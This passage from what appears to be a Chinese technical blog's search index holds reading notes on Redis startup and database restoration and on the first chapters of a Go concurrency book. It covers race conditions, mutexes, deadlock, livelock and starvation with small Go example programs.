initialized\n\n还原数据库状态在完成了对服务器状态server变量的初始化之后，服务器需要载入RDB文件或者AOF文件，并根据文件记录的内容来还原服务器的数据库状态。根据服务器是否启用了AOF持久化功能，服务器载入数据时所使用的目标文件会有所不同：\n\n如果服务器启用了AOF持久化功能，那么服务器使用AOF文件来还原数据库状态。\n相反地，如果服务器没有启用AOF持久化功能，那么服务器使用RDB文件来还原数据库状态。\n\n当服务器完成数据库状态还原工作之后，服务器将在日志中打印出载入文件并还原数据库状态所耗费的时长。\n2024-11-13T01:58:13.883532676Z 1:M 13 Nov 2024 01:58:13.883 * Loading RDB produced by version 7.4.12024-11-13T01:58:13.883543863Z 1:M 13 Nov 2024 01:58:13.883 * RDB age 169350 seconds2024-11-13T01:58:13.883545635Z 1:M 13 Nov 2024 01:58:13.883 * RDB memory usage when created 1.16 Mb2024-11-13T01:58:13.883549523Z 1:M 13 Nov 2024 01:58:13.883 * Done loading RDB, keys loaded: 1, keys expired: 0.2024-11-13T01:58:13.883742175Z 1:M 13 Nov 2024 01:58:13.883 * DB loaded from disk: 0.000 seconds\n\n执行事件循环在初始化的最后一步，服务器将打印出以下日志：\n2024-11-13T01:58:13.883757032Z 1:M 13 Nov 2024 01:58:13.883 * Ready to accept connections tcp\n\n并开始执行服务器的事件循环（loop）。至此，服务器的初始化工作圆满完成，服务器现在开始可以接受客户端的连接请求，并处理客户端发来的命令请求了。\nEnd至此，这本书已经读完一半了。剩下还有两部分，多机数据库的实现（第十五至十七章）和独立功能的实现（第十八至第二十四章）。由于这本书是16年出版的，所使用的redis版本为2.9 ，而我测试使用的redis版本为7.4经过近十年的更新，书中很多api和参数可能已经变化或弃用。不过整体架构肯定是一脉相承的。所以这本书的阅读就到这里了。\n最后，技术相关书籍的阅读学习还是要找近两三年出版的比较好。特别是关于实现方面，涉及大量需要实际搭环境验证的场景，过时的内容非常影响阅读。另外，非常推荐阅读官方文档，Redis官方文档还是挺详细的，还有AI式的搜索。但是关于设计方面，思想不会过时，架构则是根据实际需要去设计调整。那么这本书还是值得一看的。\n","categories":["读书笔记"],"tags":["Redis","数据库","《Redis设计与实现》"]},{"title":"《go语言并发之道》读书笔记-关于并发","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8Ago%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E4%B9%8B%E9%81%93%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%85%B3%E4%BA%8E%E5%B9%B6%E5%8F%91/","content":"前言又开新书了，按照原来的计划，其实这次应该读的是 Kafka 相关的。但奈何计划赶不上变化。\n前几天给鱼排论坛写了聊天室的消息分发节点 rhyus-golang，纯纯的多线程需要考虑并发的应用（虽然并发不高）。所以变成了并发相关的书。\n这篇计划阅读前两章，是关于并发概念的。\n第一章 - 并发概述书中前面关于摩尔定律、Web Scale和云计算相关的话题就跳过了。\n为什么并发很难？众所周知，并发代码是很难正确构建的。它通常需要完成几个迭代才能让它按预期的方式工作，即使这样，在某些时间点（更高的磁盘利用率、更多的用户登录到系统等)到达之前，bug在代码中存在数年的事情也不少见，以至于以前未被发现的bug在后面显露出来。这段话我是有点体会的，上面的节点程序我迭代了很多次，很多问题都得在高并发或者高负载时才会出现。\n竞态条件当两个或多个操作必须按正确的顺序执行，而程序并未保证这个顺序，就会发生竞争条件。大多数情况下，这将在所谓的数据中出现，其中一个并发操作尝试读取一个变量，而在某个不确定的时间，另一个并发操作试图写入同一个变量。\n下面是一个基本示例：\npackage mainimport &quot;fmt&quot;func main() &#123;\tvar data int\tgo func() &#123;\t\tdata++\t&#125;()\tif data == 0 &#123;\t\tfmt.Printf(&quot;the value is %v.\\n&quot;, data)\t&#125;&#125;\n\n这里，第8行和第11行都试图访问变量data,但并不能保证以什么顺序进行访问。运行这段代码有三种可能的结果：\n\n不打印任何东西。在这种情况下，第8行在第10行之前执行。\n打印“the value is 0.”。在这种情况下，第10行和第11行在第8行之前执行。\n打印“the value is 1.”。在这种情况下，第8行在第10行之前执行，但第8行在第11行之前执行。\n\n如你所见，虽然只有几行不正确的代码，但在你的程序中引入了巨大的不确定性。在并发代码中定位问题是非常困难的，需要考虑到各种可能出现的情况。\n有时候想象在两个操作之间会经过很长一段时间很有帮助。假设调用goroutine的时间和它运行的时间相差1h。那程序的其余部分将如何运行呢？如果在goroutine执行成功和程序执行到if语句之间也花费了一小时，又会发生什么呢？以这种方式思考对我很有帮助，因为对于计算机来说，规模可能不同，但相对的时间差异或多或少是相同的。\n所以有时候，会出现下面的代码（在程序中大量使用休眠语句）\npackage mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func main() &#123;\tvar data int\tgo func() &#123;\t\tdata++\t&#125;()\ttime.Sleep(1 * time.Second) // 这种方式非常不优雅\tif data == 0 &#123;\t\tfmt.Printf(&quot;the value is %v.\\n&quot;, data)\t&#125;&#125;\n\n我们的数据竞争问题解决了吗？并没有。事实上，在这个程序中之前的三个结果仍然有可能出现，只是可能性更小了。我们在调用 goroutine 和检查数据值之间的休眠的时间越长，我们的程序就越接近正确，但那只是概率上接近逻辑的正确性：它永远不会真的变成逻辑上的正确。\n除此之外，这让我们的算法变得低效。我们现在不得不休眠1s,来降低我们的程序出现数据竞争的可能。所以，我们应该始终以逻辑正确性为目标。在代码中引人休眠可以方便地调试并发程序，但这并不能称之为一个解决方案。\n\n竞争条件是最难以发现的并发bug类型之一，因为它们可能在代码投人生产多年之后才出现。通常代码正在执行时环境产生变化，或发生了某些罕见的事情，都有可能使其浮现出来。往往代码只是看上去在用正确的方式来执行，但是事实上只是执行的顺序是正确的这件事本身的概率比较大而已，最终早晚有可能会出现一些意想之外的结果。\n\n原子性当某些东西被队为是原子的，或者具有原子性的时候，这意味着在它运行的环境中，它是不可分割的或不可中断的。\n那么这到底意味着什么，为什么在使用并发代码时知道这一点很重要？第一件非常重要的事情是“上下文(context)”这个词。可能在某个上下文中有些东西是原子性的，而在另一个上下文中却不是。在你的进程上下文中进行原子操作在操作系统的上下文中可能就不是原子操作；在操作系统环境中原子操作在机器环境中可能就不是原子的，在你的机器上下文中原子操作在你的应用程序的上下文中可能不是原子的。换句话说，操作的原子性可以根据当前定义的范围而改变。这种特性对你来说有利有弊！\n在考虑原子性时，经常第一件需要做的事就是定义上下文或范围，然后再考虑这些操作是否是原子性的。一切都应当遵循这个原则。\n术语“不可分割”(indivisible)和“不可中断”(uninterruptible)。这些术语意味着在你所定义的上下文中，原子的东西将被完整的运行，而在这种情况下不会同时发生任何事情。这仍然是一个整体，所以我们来看一个例子：i++这是一个任何人都可以设计的简单例子，但它很容易证明原子性的概念。它可能看起来很原子，但是简要地分析一下就会发现其中有以下步骤：\n\n检索i的值。\n增加i的值。\n存储i的值。\n\n尽管这些操作中的每一个都是原子的，但三者的结合就可能不是，这取决于你的上下文。这揭示了原子操作的一个有趣的性质：将它们结合并不一定会产生更大的原子操作。使一个操作变为原子操作取决于你想让它在哪个上下文中。如果你的上下文是一个没有并发进程的程序，那么该代码在该上下文中就是原子的。如果你的上下文是一个goroutine,它不会将i暴露给其他 goroutine ,那么这个代码就是原子的。\n为什么我们要关心这些呢？原子性非常重要，因为如果某个东西是原子的，隐含的意思是它在并发环境中是安全的。这使我们能够编写逻辑上正确的程序，并且这甚至可以作为优化并发程序的一种方式。但大多数语句不是原子的，更不用说函数、方法和程序了。后面会通过各种方法来调和这个矛盾。\n内存访问同步假设有这样一个数据竞争：两个并发进程试图访问相同的内存区域，它们访问内存的方式不是原子的。将之前的数据竞争的例子稍作修改就可以说明：\npackage mainimport &quot;fmt&quot;func main() &#123;\tvar data int\tgo func() &#123; data++ &#125;()\tif data == 0 &#123;\t\tfmt.Println(&quot;the value is 0.&quot;)\t&#125; else &#123;\t\tfmt.Printf(&quot;the value is %v.\\n&quot;, data)\t&#125;&#125;\n\n在这里添加了一个e1se子句，所以不管数据的值如何，我们总会得到一些输出。请记住，正如之前所介绍，如果有一个数据竞争存在，那么该程序的输出将是完全不确定的。实际上，程序中需要独占访问共享资源的部分有一个专有名词，叫临界区(critical section)。在这个例子中，我们有三个临界区：\n\n我们的 goroutine 正在增加数据变量。\n我们的 if 语句，它检查数据的值是否为0。\n我们的 fmt.Printf 语句，在检索并输出数据的值。\n\n有很多方法可以保护你的程序的临界区，go语言在设计时有一些更好的想法来解决这个问题，不过解决这个问题的其中一个办法是在你的临界区之间内存访问做同步。（加锁）下面的代码不是Go语言中惯用的方法（我不建议像这样解决你的数据竞争问题)，但它很简单地演示了内存访问同步。\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar memoryAccess sync.Mutex\tvar value int\tgo func() &#123;\t\tmemoryAccess.Lock()\t\tvalue++\t\tmemoryAccess.Unlock()\t&#125;()\tmemoryAccess.Lock()\tif value == 0 &#123;\t\tfmt.Printf(&quot;the value is %v.\\n&quot;, value)\t&#125; else &#123;\t\tfmt.Printf(&quot;the value is %v.\\n&quot;, value)\t&#125;\tmemoryAccess.Unlock()&#125;\n\n在这里添加一个变量 memoryAccess，它将允许我们的代码对内存数据的访问做同步。（锁，后续介绍）这样虽然解决了数据竞争，但是并没有解决竞争条件。即这个程序的操作顺序仍然是不确定的，只是缩小了非确定性的范围。\n从表面上看，这似乎很简单：如果你发现你的代码中有临界区，那就添加锁来同步内存访问！虽然通过内存访问同步来解决一些问题，但正如我们刚刚看到的，它不会自动解决数据竞争或逻辑正确性问题。此外，它也可能造成维护和性能问题。\n还有个问题就是 Lock 的调用会使我们的程序变慢。每次执行这些操作时，我们的程序就会暂停一段时间。这会带来两个问题：\n\n临界区是否是频繁进入和退出？（锁竞争）\n临界区应该有多大？（锁的粒度）\n\n在程序的上下文中解决这两个问题是一种艺术，并且增加了内存访问同步的难度。\n死锁、活锁和饥饿死锁死锁程序是所有的并发进程彼此等待的程序。在这种情况下，如果没有外界的干预，这个程序将永远无法恢复。\n这听起来很严峻，那是因为的确如此！Go语言的运行时会尽其所能，检测一些死锁（所有的goroutine必须被阻塞，或者“asleep”），但是这对于防止死锁并没有太多的帮助。\n下面是一个死锁的例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;\t&quot;time&quot;)type value struct &#123;\tmu    sync.Mutex\tvalue int&#125;func main() &#123;\tvar wg sync.WaitGroup\tprintSum := func(v1, v2 *value) &#123;\t\tdefer wg.Done()\t\tv1.mu.Lock()\t\tdefer v1.mu.Unlock()\t\ttime.Sleep(time.Second)\t\tv2.mu.Lock()\t\tdefer v2.mu.Unlock()\t\tfmt.Printf(&quot;sum = %v\\n&quot;, v1.value+v2.value)\t&#125;\tvar a, b value\twg.Add(2)\tgo printSum(&amp;a, &amp;b)\tgo printSum(&amp;b, &amp;a)\twg.Wait()&#125;\n\n运行会报错 fatal error: all goroutines are asleep - deadlock!\n事实证明，出现死锁有儿个必要条件。I971年，Edgar Coffman 在一篇论文中列举了这些条件。这些条件现在被称为 Coffman 条件，是帮助检测、防止和纠正死锁的技术依据。Coffman 条件如下：\n\n互斥条件 - 并发进程同时拥有资源的独占权。\n占有并等待条件 - 并发进程必须同时拥有一个资源，并等待额外的资源。\n非抢占条件 - 并发进程拥有的资源只能被该进程释放，即可满足这个条件。\n循环等待条件 - 一个并发进程(P1)必须等待一系列其他并发进程(P2),这些并发进程同时也在等待进程(P1),这样便满足了这个最终条件。\n\n这些规则也帮助我们防止死锁。如果确保至少有一个条件不成立，我们可以防止发生死锁。不幸的是，实际上这些条件很难推理，因此很难预防。\n活锁活锁是正在主动执行并发操作的程序，但是这些操作无法向前推进程序的状态。\n你曾经在走廊走向另一个人吗？她移动到一边让你通过，但你也做了同样的事情。所以你转到另一边，但她也是这样做的。想象一下这个情形永远持续下去，你就明白了活锁。这个倒是经常发生\n下面是一个活锁的例子，就是上面所说的情况：\npackage mainimport (\t&quot;bytes&quot;\t&quot;fmt&quot;\t&quot;sync&quot;\t&quot;sync/atomic&quot;\t&quot;time&quot;)type value struct &#123;\tmu    sync.Mutex\tvalue int&#125;func main() &#123;\tcadence := sync.NewCond(&amp;sync.Mutex&#123;&#125;)\tgo func() &#123;\t\tfor range time.Tick(1 * time.Millisecond) &#123;\t\t\tcadence.Broadcast()\t\t&#125;\t&#125;()\ttakeStep := func() &#123;\t\tcadence.L.Lock()\t\tcadence.Wait()\t\tcadence.L.Unlock()\t&#125;\ttryDir := func(dirName string, dir *int32, out *bytes.Buffer) bool &#123;\t\tfmt.Fprintf(out, &quot; %v&quot;, dirName)\t\tatomic.AddInt32(dir, 1)\t\ttakeStep()\t\tif atomic.LoadInt32(dir) == 1 &#123;\t\t\tfmt.Fprint(out, &quot;Success!&quot;)\t\t\treturn true\t\t&#125;\t\ttakeStep()\t\tatomic.AddInt32(dir, -1)\t\treturn false\t&#125;\tvar left, right int32\ttryLeft := func(out *bytes.Buffer) bool &#123; return tryDir(&quot;left&quot;, &amp;left, out) &#125;\ttryRight := func(out *bytes.Buffer) bool &#123; return tryDir(&quot;right&quot;, &amp;right, out) &#125;\twalk := func(walking *sync.WaitGroup, name string) &#123;\t\tvar out bytes.Buffer\t\tdefer func() &#123; fmt.Println(out.String()) &#125;()\t\tdefer walking.Done()\t\tfmt.Fprintf(&amp;out, &quot;%v is trying to scoot:&quot;, name)\t\tfor i := 0; i &lt; 5; i++ &#123;\t\t\tif tryLeft(&amp;out) || tryRight(&amp;out) &#123;\t\t\t\treturn\t\t\t&#125;\t\t&#125;\t\tfmt.Fprintf(&amp;out, &quot;\\n%v tosses her hands up in exasperation!&quot;, name)\t&#125;\tvar peopleInHallway sync.WaitGroup\tpeopleInHallway.Add(2)\tgo walk(&amp;peopleInHallway, &quot;Alice&quot;)\tgo walk(&amp;peopleInHallway, &quot;Barbara&quot;)\tpeopleInHallway.Wait()&#125;\n\n输出如下：\nAlice is trying to scoot: left right left right left right left right left rightAlice tosses her hands up in exasperation!Barbara is trying to scoot: left right left right left right left right left rightBarbara tosses her hands up in exasperation!\n\n你可以看到，Alice和Barbara在最终退出之前，会持续竞争。\n\ntryDir 函数允许一个人尝试向一个方向移动，并返回是否成功。dir 表示试图朝这个方向移动的人数。\n首先，宣布尝试向这个方向移动，atomic 使 dir 原子操作加一。\ntakeStep 函数调用 cadence.Wait 来等待其他并发进程，用以同步每个协程的节奏。因为要演示活锁，每个人都必须以相同的速度或节奏移动。\n当意识到不能向这个方向走时，便放弃。将 dir 减一。\nwalk 函数中，人为限制了尝试的次数，否则，它将会一直无意义执行下去。\nwalk 中，会尝试向左走，如果失败，则尝试向右走。\n\n这个例子演示了使用活锁的一个十分常见的原因：两个或两个以上的并发进程试图在没有协调的情况下防止死锁。这就好比，如果走廊里的人都同意，只有一个人会移动，那就不会有活锁；一个人会站着不动，另一个人会移到另一边，他们就会继续移动。在我看来，活锁要比死锁更复杂，因为它看起来程序好像在工作。如果一个活锁程序在你的机器上运行，那你可以通过查看CPU利用率来确定它是否在做处理某些逻辑，你可能会认为它确实是在工作。根据活锁的不同，它甚至可能发出其他信号，让你认为它在工作。然而，你的程序将会一直上演“hallway-shuffle’”的循环游戏。\n活锁是一组被称为“饥饿”的更大问题的子集。\n饥饿饥饿是在任何情况下，并发进程都无法获得执行工作所需的所有资源。\n当我们讨论活锁时，每个goroutine的资源是一个共享锁。\n活锁保证讨论与饥饿是无关的，因为在活锁中，所有并发进程都是相同的，并且没有完成工作。更广泛地说，饥饿通常意味着有一个或多个贪婪的并发进程，它们不公平地阻止一个或多个并发进程，以尽可能有效地完成工作，或者阻止全部并发进程。\n下面的例子有一个贪婪的 goroutine 和一个平和的 goroutine：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;\t&quot;time&quot;)func main() &#123;\tvar wg sync.WaitGroup\tvar sharedLock sync.Mutex\tconst runtime = 1 * time.Second\tgreedyWorker := func() &#123;\t\tdefer wg.Done()\t\tvar count int\t\tfor begin := time.Now(); time.Since(begin) &lt;= runtime; &#123;\t\t\tsharedLock.Lock()\t\t\ttime.Sleep(3 * time.Nanosecond)\t\t\tsharedLock.Unlock()\t\t\tcount++\t\t&#125;\t\tfmt.Printf(&quot;Greedy worker was able to execute %v work loops.\\n&quot;, count)\t&#125;\tpoliteWorker := func() &#123;\t\tdefer wg.Done()\t\tvar count int\t\tfor begin := time.Now(); time.Since(begin) &lt; runtime; &#123;\t\t\tsharedLock.Lock()\t\t\ttime.Sleep(1 * time.Nanosecond)\t\t\tsharedLock.Unlock()\t\t\tsharedLock.Lock()\t\t\ttime.Sleep(1 * time.Nanosecond)\t\t\tsharedLock.Unlock()\t\t\tsharedLock.Lock()\t\t\ttime.Sleep(1 * time.Nanosecond)\t\t\tsharedLock.Unlock()\t\t\tcount++\t\t&#125;\t\tfmt.Printf(&quot;Polite worker was able to execute %v work loops.\\n&quot;, count)\t&#125;\twg.Add(2)\tgo greedyWorker()\tgo politeWorker()\twg.Wait()&#125;\n\n输出如下：\nGreedy worker was able to execute 33 work loops.Polite worker was able to execute 12 work loops.\n\n贪婪的 worker 会贪婪地抢占共享锁，以完成整个工作循环，而平和的 worker 只会在必要时锁定。两种 worker 都做到同样的工作（sleep 3 ns），但贪婪的 worker 工作量会比平和的 worker 多得多。\n通过记录和采样确定进程工作速度是否符合预期，可以发现和解决饥饿。所以，饥饿会导致你的程序表现不佳或不正确。前面的示例演示了低效场景，但是如果你有一个非常贪婪的并发进程，以至于完全阻止另一个并发进程完成工作，那么你就会遇到一个更大的问题。我们还应该考虑到来自于外部过程的饥饿。请记住，饥饿也可以应用于CPU、内存、文件句柄、数据库连接：任何必须共享的资源都是饥饿的候选者。\n第二章 - 对你的代码建：通信顺序进程并发与并行的区别\n并发属于代码，并行属于一个运行中的程序。\n\n这个区别其实仔细体会一下，描述得很清楚。比如，我写了一个两部分可以并行运行的程序，但我却在一个只有一个核心的机器上运行它。那么同一时刻只会有一个部分被执行，他不可能是并行的。但如果是多个核心的机器，那么两个部分就可以并行执行。但这两台机器上我们都可以认为它是并发的，因为并发是一段时间内两个部分都被执行就认为是并发的。（当然，这句是我以前的观点。学习操作系统进程相关知识时的观点）\n但这章中的观点是：并行是一个时间或者上下文的函数。上一章中，上下文被定义为一个操作被认为是原子性的界限。这里，上下文定义为两个或以上的操作被认为是并行的界限。\n比如，我们的上下文是一段5s的时长，执行了两个分别消耗1s的操作，我们应该认为这些操作是并行执行的。但如果我们的上下文是1s，应该认为这些操作是分别运行的。\n对于我们来说，用不同的时间对上下文的概念进行重定义并不是一件好事，但是请记住上下文和时间并设有关系。我们可以把上下文定义成我们程序所在运行的进程，一个操作系统的线程，或者是一台机器。这很重要，因为你所定义的上下文是和并发性以及正确性密切相关。就像原子操作可以按照你所定义的上下文来定义是否为原子性，并发操作也依据你所定义的上下文来确定正确性。一切都是相关的。\n什么是 CSPCSP即“Communicating Sequential Processes’”(通信顺序进程)，既是个技术名词，也是介绍这种技术的论文的名字。在1978年，Charles Antony Richard Hoare在Association for Computing Machinery(一般被称作ACM)中发表的论文。在这篇论文里，Hoar认为输入与输出是两个被忽略的编程原语，尤其是在并发代码中。在Hoare写作这篇论文的同时，关于如何架构程序的相关研究还在进行中，但是大部分的研究都是针对编写顺序代码的方法：goto语句的使用正在被讨论，面向对象范型正在成为编程的基石。并发操作并没有被给予过多的思考。Hoare开始纠正这个现象，所以，关于CSP的这篇论文就横空出世了。在1978年的论文中，CSP仅是一个完全用来展示通信顺序进程的能力的一个简单的编程语言。事实上，他甚至在论文中写道：因此，本文介绍的概念和符号应该...不被认为适合作为一种编程语言，无论是抽象的还是具体的编程。\n而且正是因为CSP的原始论文以及从论文中进化而来的原语正是Go语言并发模型的主要灵感，而这正是我们接下来所要聚焦的。\n用来支撑他关于输入与输出需要被按照语言的原语来考虑，Hoare的CSP编程语言包含用来建模输入与输出，或者说“在进程间正确通信”（这就是论文名字的由来)的原语。为了在进程之间进行通信，Hoar心创造了输入与输出的命令：！代表发送输入到一个进程，？代表读取一个进程的输出。每一个指令都需要指定具体是一个输出变量（从一个进程中读取一个变量的情况），还是一个目的地（将输入发送到一个进程的情况)。有时，这两种方法会引用相同的东西，在这种情况下，这两个过程会被认为是相对应的。换言之，一个进程的输出应该直接流向另一个进程的输入。\n这种语言同时利用了一个所谓的守护命令，也就是Edgar Dijkstra在一篇之前在I974年所写的论文中介绍的，“Guarded commands,nondeterminacy and formal derivation of programs’”。一个有守护的命令仅仅是一个带有左和右倾向的语句，由一来分割。左侧服务是有运行条件的，或者是守护右侧服务，如果左侧服务运行失败，或者在一个命令执行后，返回false或者退出，右侧服务永远不会被执行。将这些与Hoare的I&#x2F;O命令组合起来，为Hoare的通信过程奠定了基础，从而实现了channel。\n经验判断Hoare的建议是正确的，然而，有趣的是，在Go语言发布之前，很少有语言能够真正地为这些原语提供支持。大多数流行的语言都支持共享和内存访问同步到CSP的消息传递样式。 当然也有例外，但不幸的是，这些都局限于没有广泛采用的语言。Go语言是最早将CSP的原则纳人共核心的语言之一，并将这种并发编程风格引入到大众中。它的成功也使得其他语言尝试添加这些原语。内存访问同步并不是天生就不好。在Go语言中，甚至有时共享内存在某些情况下是合适的。但是，共享内存模型很难正确地使用，特别是在大型或复杂的程序中。正是由于这个原因，并发被认为是Go语言的优势之一，它从一开始就建立在CSP的原则之上，因此很容易阅读、编写和推理。\nGo语言的并发哲学CSP一直都是Go语言设计的重要组成部分。然而，Go语言还支持通过内存访问同步和遵循该技术的原语来编写并发代码的传统方式。sync与其他包中的结构体与方法可以让你执行锁，创建资源池取代goroutine等。\n能够在CSP原语和内存访问同步之间选择对于你来说很棒，因为它让你去编写解决问题的并发代码上有了更多选择，但这可能显得有些莫名其妙。Go语言的初学者总是认为CSP样式编写并发代码是Go语言编写并发代码的唯一方式。比如说，在sync包的文档中，有如下描述：\n\nsync包提供了基本的同步基元，如互斥锁。除了Once类型和WaitGroup类型，大部分都是适用低水平程序线程，高水平的同步使用channel通信更好一些。\n\n在Go语言的FAQ中，有如下陈述：\n\n为了尊重mutex,sync包实现了mutex,但是我们希望Go语言的编程风格将会鼓励人们尝试更高等级的技巧。尤其是考虑构建你的程序，以便一次只有一个goroutine负责某个特定的数据。不要通过共享内存进行通信。相反，通过通信来共享内存。有数不清的关于Go语言核心图队的文章、讲座和访谈，相对于使用像sync.Mutex这样的原语，他们更加拥护CSP。\n\n因此，Go语言团队为什么选择公开内存访问同步原语会感到困惑是完全可以理解的。更令人因惑的是，你通常会在外面看到出现的同步原语。见到人们抱怨过度使用channel,也会听到一些Go语言团队成员说使用它们是“OK”的。Go语言的维基上有一个关于此的引用：\n\nGo语言的一个座右铭是，“使用通信来共享内存，而不是通过共享内存来通信。”这就是说，Go语言确实在syc包中提供了传统的锁机制。大多数的锁问题都可以通过channel或者传统的锁两者之一来解决。所以说，我该用哪个？使用最好描述和最简单的那个方式。\n\n这是很好的建议，也是你在使用Go语言时经常看到的谁则，但它有点含糊。我们如何理解什么更具表现力、更简单？我们应该使用什么标准？幸运的是，我们可以使用一些标准来帮助我们做正确的事情。正如我们将看到的那样，我们主要的区分方式来自于试图管理并发的地方：主观地想象一个狭窄的范围，或者在我们的系统外部。\n\n让我们逐步来介绍这些决策：\n你想要转让数据的所有权么？如果你有一块产生计算结果并想共享这个结果给其他代码块的代码，你所实际做的事情是传递了数据的所有权。如果你对内存所有制且不支持GC的语言很熟悉的话，对于这个概念你应该是很熟悉的：数据拥有所有者，并发程序安全就是保证同时只有一个并发上下文拥有数据的所有权。channel通过将这个意图编写进channel类型本身来帮助我们表达这个意图。\n这么做的一个很大的好处就是可以创建一个带缓存的channel来实现一个低成本的在内存中的队列来解耦你的生产者与消费者。另一个好处就是通过使用channel确保你的并发代码可以和其他的并发代码进行组合。\n你是否试图在保护某个结构的内部状态？这时候内存访问同步原语的一个很好的选择，也是一个你不应该使用channel的很好的示例。通过使用内存访问同步原语，可以为你的调用者隐藏关于重要代码块的实现细节。这是一个线程安全类型的小例子，且不会给调用者带来复杂性：\npackage mainimport &quot;sync&quot;type Counter struct\tmu    sync.Mutex\tvalue int&#125;func (c *Counter) Increment() &#123;\tc.mu.Lock()\tdefer c.mu.Unlock()\tc.value++&#125;\n\n如果你能回想起关于原子性的细节，可以说我们在这里所做的就是定义了Counter类型的原子性范围。调用增量可被认为是原子的。记住这里的关键词是“内部的”。如果你发现自己正在将锁暴露在一个类型之外，这时侯你应该注意了。试着将你的锁放在一个小的字典范围内。\n你是否试图协调多个逻辑片段？请记住，channel本质上比内存访问同步原语更具可组合性。将锁分散在整个对象图中听起来像是一场噩梦，但是，将channel编写的随处可见是被鼓励以及期待的！我可以组合channel,但是我不能轻易的组合锁或者有返回值的方法。\n你会发现，因为Go语言的select语句，以及channel可以当作队列使用和被安全的随意传递。所以，当在使用channel的时候，你可以更简单的控制你软件中出现的激增的复杂性。如果你发现正在挣扎着理解你的并发代码是如何工作的，为什么会出现死锁以及竞争，而你正在只用原语，这是一个你应该切换到channel的好示例。\n这是一个对性能要求很高的临界区吗？这绝对不意味着“我想让我的程序拥有高性能，因此，我应该只是用mutex’”。当然，如果你程序中的某部分，事实证明是一个主要的性能瓶颈，比程序的其他部分慢几个数量级，使用内存访问同步原语可能会帮助这个重要的部分在负载下执行。这是因为channel使用内存访问同步来操作，因此它们只能更慢。然而，在我们考虑这一点之前，性能至关重要的程序部分可能暗示着需要重新规划我们的程序。\n希望这可以清楚地说明是否利用CSP风格的并发或内存访问同步。还有其他一些模式和做法在使用操作系统线程作为并发抽象方式的语言中很有用。在使用操作系统线程作为主要并发抽象的语言中还有其他的方式以及实践。比如说，像是线程池之类的东西经常出现。因为这些抽象大多数都是为了利用操作系统线程的优点与缺点。Go语言的并发性哲学可以这样总结：追求简洁，尽量使用channel,并且认为goroutine的使用是没有成本的。\n","categories":["读书笔记"],"tags":["《go语言并发之道》","go","并发"]},{"title":"《go语言并发之道》读书笔记-并发组件","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8Ago%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E4%B9%8B%E9%81%93%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%B9%B6%E5%8F%91%E7%BB%84%E4%BB%B6/","content":"第三章 - Go语言并发组件这章介绍Go中的特性，以及它如何支持并发。（终于到实际使用了\ngoroutinegoroutine是Go语言程序中最基本的组织单位之一。每个Go语言程序都至少有一个goroutine:main goroutine，它在进程开始时自动创建并启动。几乎在所有的项目中，你迟早会使用goroutine来解决Go语言编程遇到的问题。所以，它们是什么？\n简单地说，goroutine是一个并发的函数（记住：不一定是并行的），与其他代码一起运行。你可以简单地在一个函数之前添加go关键字来触发：go sum()同样可以作为匿名函数使用！这里有一个例子和前面的例子一样。然而，我们不是创建一个基于函数的goroutine,而是创建一个基于匿名函数 goroutine:go func() &#123; // ... &#125;()\n下面的内容来看看 goroutine 是如何工作的？它们是OS线程吗？绿色线程？我们能创造多少个 goroutine？\nGo语言中的goroutine是独一无二的（尽管其他的一些语言有类似的并发原语)。它们不是OS线程，也不是绿色线程（由语言运行时管理的线程），它们是一个更高级别的抽象，称为协程。协程是一种非抢占式的简单并发子goroutine(函数、闭包或方法)，也就是说，它们不能被中断。 取而代之的是，协程有多个点，允许暂停或重新进入。\ngoroutine的独特之处在于它们与Go语言的运行时的深度集成。goroutine没有定义自己的暂停方法或再运行点。Go语言的运行时会观察goroutine的运行时行为，并在它们阻塞时自动挂起它们，然后在它们不被阻塞时恢复它们。在某种程度上，这使它们成为可抢占的，但只是在goroutine被阻塞的情况。 在运行时和goroutine的逻辑之间，是一种优雅的伙伴关系。因此，goroutine可以被认为是一种特殊类型的协程。\n协程和goroutine都是隐式并发结构，但并发并不是协程的属性：必须同时托管多个协程，并给每个协程一个执行的机会。否则，它们就不会并发！请注意，这并不意味着协程是隐式并行的。当然有可能有几个协程按顺序并行执行的假象，事实上，这种情况一直在发生。\nGo语言的主机托管机制是一个名为M:N调度器的实现，这意味着它将M个绿色线程映射到N个OS线程。然后将goroutine安排在绿色线程上。当我们的goroutine数量超过可用的绿色线程时，调度程序将处理分布在可用线程上的goroutine,并确保当这些goroutine被阻塞时，其他的goroutine可以运行。这里只介绍Go语言的并发模型，细节在后续章节中。\nGo语言遵循一个称为ork-join的并发模型。fork这个词指的是在程序中的任意一点，它可以将执行的子分支与共父节点同时运行。jon这个词指的是，在将来某个时候，这些并发的执行分支将会合并在一起。\nGo语言是如何执行fork的，执行的子线程是goroutine。让我们回到简单的goroutine例子：\npackage mainimport &quot;fmt&quot;func main() &#123;\tsayHello := func() &#123;\t\tfmt.Println(&quot;hello&quot;)\t&#125;\tgo sayHello()\t//继续执行自己的逻辑&#125;\n\n在这里，sayHello函数将在goroutine上运行，而程序的其余部分将继续执行。在本例中，没有join点。执行sayHello的goroutine将在未来的某个不确定的时间退出，而程序的其余部分将会继续执行。\n但是，这个例子有一个问题：正如上面所写的程序，它不确定sayHello函数是否会运行。goroutine将会被创建，并计划在Go语言运行时执行，但是它实际上可能没有机会在main goroutine退出之前运行。\n实际上，因为我们省略了min函数的其余部分，为了简单起见，当运行这个小示例时，几乎可以肯定的是，程序将在goroutine被系统调用之前完成执行。因此，你不会看到“hello’”这个词被打印到stdout。你可以在创建goroutine之后执行time.Sleep,但是要记住，这实际上并没有创建一个join点，只有一个竞争条件。如果回顾第1章，你增加了goroutine在程序退出前执行的概率，但你并不能保证一定会执行。join点是保证程序正确性和消除竞争条件的关键。\n为了创建一个join点，你必须同步main goroutine和sayHello goroutine。这可以通过多种方式实现，这里使用：sync.Waitgroup。下面是一个正确的例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar wg 